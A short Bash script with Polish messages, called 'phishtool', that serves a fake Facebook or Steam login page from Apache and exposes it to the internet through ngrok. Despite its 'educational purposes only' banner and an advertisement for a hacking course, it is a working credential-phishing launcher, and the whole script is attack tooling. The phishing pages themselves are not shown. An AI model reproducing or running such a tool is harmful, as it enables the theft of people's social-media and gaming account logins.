#!/bin/bash
echo "Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 1.1"
sleep 2
echo "kup kurs na www.ehaker.pl"
sleep 2
echo "Wybierz opcje"
echo "================="
echo "[1] --->Facebook"
echo "[2] --->Steam"
echo "================="

sudo service apache2 start

read opcja
 
if [ $opcja = 1 ]
then
	echo "wybrales fb";
	sudo rm /var/www/html/index.html
	sudo cp facebook/index.html /var/www/html/index.html
	./ngrok http 80
	firefox http://127.0.0.1:4040
	sudo rm /var/www/html/index.html
else
	echo "wybrales Steama";
	sudo rm /var/www/html/index.html
	sudo cp steam/index.html /var/www/html/index.html
	./ngrok http 80
	firefox http://127.0.0.1:4040
	sudo rm /var/www/html/index.html


echo " Narzędzie zakończyło pracę "
sudo service apache2 stop
sleep 2
exit
fi
